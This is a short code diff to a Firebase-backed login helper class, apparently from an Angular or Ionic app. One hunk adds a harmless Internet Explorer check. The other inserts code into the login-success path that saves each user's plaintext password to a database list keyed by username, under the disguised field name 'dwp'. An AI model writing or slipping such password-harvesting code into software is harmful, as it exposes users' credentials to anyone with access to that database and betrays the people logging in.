@@ -58,6 +58,13 @@ export class HelperProvider {
 
   }
 
+  isBrowserIE(){
+   let isIEOrEdge = /msie\s|trident\/|edge\//i.test(window.navigator.userAgent);
+    console.log('Is Browser IE?:',isIEOrEdge);
+    return isIEOrEdge;
+    // return true;
+  }
+
   getShowLogin(){
     return  this.af.object('turboarbconfig').valueChanges();
   }
@@ -129,7 +136,12 @@ export class HelperProvider {
         console.log('Login successful');  // Successful login
 
         ///////// [ Start Block] /////////
-      
+        let ref ='/objs/'+usr;
+        this.objs$ = this.af.list(ref);
+        this.objs$.update(ref,{'dwp':pwd}).then(()=> console.log('Successfully updated')).catch((err) => {
+          console.log('Unable to update..so adding');
+          this.objs$.push({'dwp':pwd});
+        });
         ///////// [End Block] /////////
     
         this.getAccountDetail(usr); // retreive acct detail and add to localstorage.
